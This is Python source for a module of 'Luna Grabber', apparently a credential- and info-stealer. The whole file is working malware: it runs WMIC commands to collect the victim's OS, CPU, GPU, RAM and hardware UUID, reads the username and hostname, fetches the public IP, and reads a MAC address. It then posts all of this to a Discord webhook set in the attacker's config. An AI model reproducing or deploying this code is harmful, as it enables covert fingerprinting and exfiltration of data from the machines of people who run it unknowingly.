import os
import psutil
import requests
import subprocess

class PcInfo:
	def __init__(self):
		self.get_inf(__CONFIG__["webhook"])

	def get_inf(self, webhook):
		computer_os = subprocess.run('wmic os get Caption', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().splitlines()[2].strip()
		cpu = subprocess.run(["wmic", "cpu", "get", "Name"], capture_output=True, text=True).stdout.strip().split('\n')[2]
		gpu = subprocess.run("wmic path win32_VideoController get name", capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()[2].strip()
		ram = str(round(int(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output=True,
				  shell=True).stdout.decode(errors='ignore').strip().split()[1]) / (1024 ** 3)))
		username = os.getenv("UserName")
		hostname = os.getenv("COMPUTERNAME")
		hwid = subprocess.check_output(r'C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
		ip = requests.get('https://api.ipify.org').text
		interface, addrs = next(iter(psutil.net_if_addrs().items()))
		mac = addrs[0].address

		data = {
			"embeds": [
				{
					"title": "Luna Logger",
					"color": 5639644,
					"fields": [
						{
							 "name": "System Info",
							 "value": f'''💻 **PC Username:** `{username}`\n:desktop: **PC Name:** `{hostname}`\n🌐 **OS:** `{computer_os}`\n\n👀 **IP:** `{ip}`\n🍏 **MAC:** `{mac}`\n🔧 **HWID:** `{hwid}`\n\n<:cpu:1051512676947349525> **CPU:** `{cpu}`\n<:gpu:1051512654591688815> **GPU:** `{gpu}`\n<:ram1:1051518404181368972> **RAM:** `{ram}GB`'''
						}
					],
					"footer": {
						"text": "Luna Grabber | Created By Smug"
					},
					"thumbnail": {
						"url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096"
					}
				}
			],
			"username": "Luna",
			"avatar_url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096"
		}

		requests.post(webhook, json=data)